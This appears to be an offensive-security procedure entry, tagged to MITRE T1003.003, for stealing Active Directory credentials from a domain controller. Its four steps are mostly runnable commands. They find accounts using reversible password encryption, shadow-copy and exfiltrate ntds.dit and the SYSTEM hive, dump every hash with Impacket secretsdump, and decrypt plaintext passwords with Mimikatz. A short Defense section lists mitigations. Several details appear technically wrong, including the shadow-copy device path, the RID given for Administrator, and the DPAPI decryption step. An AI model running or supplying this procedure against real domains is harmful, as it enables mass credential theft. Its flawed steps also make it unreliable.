---
id: 3a4b625e-a607-40f8-a616-6fe8924f1a65
name: NTDS-Reversible-Encryption-Dumping
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.151456+00:00'
updated_at: '2023-04-10T20:26:12.774399+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques:
  - '[[sub-techniques/NTDS|T1003.003 - NTDS]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Dumping AD Domain Credentials]]'
  - '[[tags/NTDS Reversible Encryption]]'
commands:
  - '[[commands/Get-ADUser-Reversible-Encryption-Check]]'
  - '[[commands/Impacket-Secretsdump-NTDS-Offline]]'
platforms:
  - Windows Server
tools:
  - '[[tools/Impacket]]'
  - '[[tools/Mimikatz]]'
validated: true
---

# NTDS-Reversible-Encryption-Dumping

## Summary

NTDS Reversible Encryption is an Active Directory feature that stores user passwords in an encrypted but reversible format, allowing recovery of plaintext passwords by authorized entities. This procedure details how to identify users with this feature enabled via the userAccountControl flag and dump the NTDS.dit database along with the SYSTEM registry hive for offline credential extraction. If reversible encryption is active, extracted data can be further processed to recover plaintext passwords using tools like Mimikatz, bypassing traditional hash cracking. This is particularly effective for attackers with domain admin access on a domain controller, enabling mass credential theft for lateral movement.

## Description

In Active Directory, the 'Store passwords using reversible encryption' option (enabled via group policy) sets the UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED flag (0x80 or 128) on affected user accounts, storing their passwords in a decryptable encrypted form within the NTDS.dit file rather than one-way hashes. This feature is disabled by default but can be exploited if misconfigured. The procedure targets Windows domain controllers, requiring administrative access to perform shadow copying and file extraction without disrupting services. Once dumped, tools parse the database to retrieve hashes and encrypted passwords; for reversible users, the SYSTEM hive provides DPAPI keys for decryption. This approach maps to offline credential dumping and is realistic in environments with legacy policies or insider threats.

## Requirements

1. Domain Admin credentials or equivalent privileges on a domain controller
2. Local administrator access to execute PowerShell and command-line tools on the DC
3. Volume Shadow Copy Service (VSS) enabled and writable temp directory (e.g., C:\temp)
4. Impacket suite installed on an external attacker machine (Linux/Windows) for offline processing
5. Mimikatz executable for advanced DPAPI decryption of reversible passwords
6. File transfer capability to move dumped files off the DC securely (e.g., SMB share or USB)

## Defense

1. Disable 'Store passwords using reversible encryption' in all Group Policy Objects, especially the Default Domain Policy under Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Password Policy
2. Audit and monitor GPO changes for password policy modifications using Event ID 5136 (Directory Service Changes)
3. Restrict Domain Admin logons to dedicated secure workstations and enable MFA for all privileged accounts
4. Use the Protected Users group for high-value accounts to enforce stronger protections against offline attacks
5. Monitor for shadow copy creation (Event ID 8222 in System log) and unauthorized access to C:\Windows\NTDS\ntds.dit or registry hives
6. Implement application whitelisting to block tools like Mimikatz and monitor PowerShell execution (Module Logging, Script Block Logging)

## Objectives

1. Detect and list domain users with reversible encryption enabled to prioritize targets
2. Perform a non-disruptive dump of the NTDS.dit database and SYSTEM hive using volume shadow copies
3. Extract all domain credentials offline, including hashes and encrypted reversible passwords
4. Decrypt plaintext passwords for affected users to enable further compromise of the environment

## Instructions

### Step 1: Identify Users with Reversible Encryption Enabled

**Context**: Begin by querying the Active Directory database to identify users with the reversible encryption flag set. This flag (userAccountControl & 128) indicates accounts whose passwords are stored decryptably, allowing focus on high-value targets before dumping.

**Command** ([[commands/Get-ADUser-Reversible-Encryption-Check]]):

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl | Select Name, SamAccountName
```

> This command uses the ActiveDirectory module to filter and retrieve users based on the UAC flag 0x80. It is performed on the domain controller via PowerShell. If results are returned, note the accounts for later verification in the dump; if none, the feature is inactive, but proceed with standard hash dumping for completeness.

**Expected Output**: A table listing affected users, e.g.,

Name                  SamAccountName
----                  -------------
John Doe              jdoe
Admin User            admin

**Success Indicators**:
- At least one user returned (or empty list confirming no reversible users)
- No errors like 'The term Get-ADUser is not recognized' (ensure RSAT-AD-PowerShell is installed)

### Step 2: Create Volume Shadow Copy and Extract NTDS Files

**Context**: To access the locked NTDS.dit and SYSTEM files without rebooting or stopping services, create a Volume Shadow Copy (VSS) of the system volume, then copy the files from the shadow volume. This step requires admin rights and is performed directly on the domain controller.

**Instructions**: Execute these commands in an elevated Command Prompt on the DC. Replace placeholders as needed.

1. Create the shadow copy:

```cmd
wmic shadowcopy create Volume='C:\'
```

> Expected: 'Shadow copy ID: {GUID}' (e.g., {12345678-1234-1234-1234-123456789abc})

2. List shadows to get the device path:

```cmd
vssadmin list shadows
```

> Look for the newest shadow for C:\ and note the 'Device Path' like \\?\GLOBALROOT\Device\Hardvol{ GUID }\\

3. Copy the files (replace {SHADOW_GUID} with the actual GUID):

```cmd
mkdir C:\temp
copy "\\?\GLOBALROOT\Device\Hardvol{SHADOW_GUID}\\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
copy "\\?\GLOBALROOT\Device\Hardvol{SHADOW_GUID}\\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
```

> This copies the ~50-500MB NTDS.dit and ~10MB SYSTEM hive. Why: Shadow copy provides a consistent snapshot; direct copy fails due to file locks.

**Expected Output**: '1 file(s) copied.' for each copy command.

**Success Indicators**:
- Shadow created successfully (no VSS errors)
- Files exist in C:\temp with correct sizes (ntds.dit >1MB, SYSTEM ~5-20MB)
- No access denied errors

Transfer files to attacker machine (e.g., via scp or shared folder).

### Step 3: Extract Credentials Offline with Impacket

**Context**: On the attacker's machine, use Impacket to parse the dumped files and extract all domain user hashes. For reversible encryption users identified in Step 1, the output includes encrypted password blobs that can be decrypted separately; standard NT/LM hashes are also recovered for cracking.

**Command** ([[commands/Impacket-Secretsdump-NTDS-Offline]]):

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

> Run from the directory containing the dumped files. The -system flag provides decryption keys from the hive; LOCAL outputs in hash:ntlm format. Why: Impacket automates parsing the ESE database (NTDS.dit) without needing Windows. For reversible users, look for non-standard NT hash values (encrypted cleartext); proceed to Mimikatz for decryption.

**Expected Output**: Boot key and user entries, e.g.,

[*] Target system bootKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
DOMAIN\Administrator:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
DOMAIN\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
... (one line per user)

**Success Indicators**:
- Boot key displayed (confirms SYSTEM parsing)
- Hashes for known users (e.g., Administrator) match expected format
- No 'Cannot open file' errors

### Step 4: Decrypt Reversible Passwords with Mimikatz (If Applicable)

**Context**: For users identified in Step 1, use Mimikatz to recover DPAPI master keys from the SYSTEM hive and decrypt the reversible password blobs extracted from NTDS.dit. This step requires parsing the NTDS for unicodePwd attributes (use DSInternals module or manual) and is performed on a Windows attacker machine.

**Instructions**: Download and run Mimikatz as admin. First, extract master keys:

```cmd
mimikatz.exe "privilege::debug" "dpapi::backupkeys /system:C:\path\to\SYSTEM /in:C:\path\to\masterkeys /rpc" exit
```

> This recovers DPAPI backup keys needed for offline decryption. Why: Reversible passwords are encrypted with these keys; standard hash tools can't recover plaintext without them.

Then, for each reversible user's encrypted password (from NTDS parse), run:

```cmd
mimikatz.exe "dpapi::unprotect /in:encrypted_blob.bin /masterkey:guid_from_backup /sid:S-1-5-21-..." exit
```

> Replace with actual blob file (exported from NTDS via esedbexport or DSInternals) and master key GUID/SID. Expected: Plaintext password output if successful.

**Expected Output**: 'SecData: cleartext_password_here'

**Success Indicators**:
- Master keys extracted (list of GUIDs)
- Decryption yields readable plaintext for tested users
- No 'Invalid masterkey' errors (ensure correct SYSTEM hive)
